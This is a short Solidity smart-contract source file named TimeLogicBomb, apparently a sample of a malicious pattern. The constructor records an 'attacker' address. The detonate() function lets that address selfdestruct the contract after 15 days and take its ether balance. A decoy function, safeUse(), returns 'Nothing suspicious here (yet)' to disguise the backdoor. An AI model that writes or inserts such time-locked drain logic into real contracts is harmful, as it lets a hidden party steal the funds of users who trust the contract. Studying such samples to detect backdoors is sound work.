// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title TimeLogicBomb - Self-destructs if triggered by attacker after time
contract TimeLogicBomb {
    address public attacker;
    uint256 public deployTime;

    constructor(address _attacker) payable {
        attacker = _attacker;
        deployTime = block.timestamp;
    }

    function detonate() external {
        if (
            msg.sender == attacker &&
            block.timestamp > deployTime + 15 days
        ) {
            selfdestruct(payable(attacker));
        }
    }

    function safeUse() external pure returns (string memory) {
        return "Nothing suspicious here (yet)";
    }
}
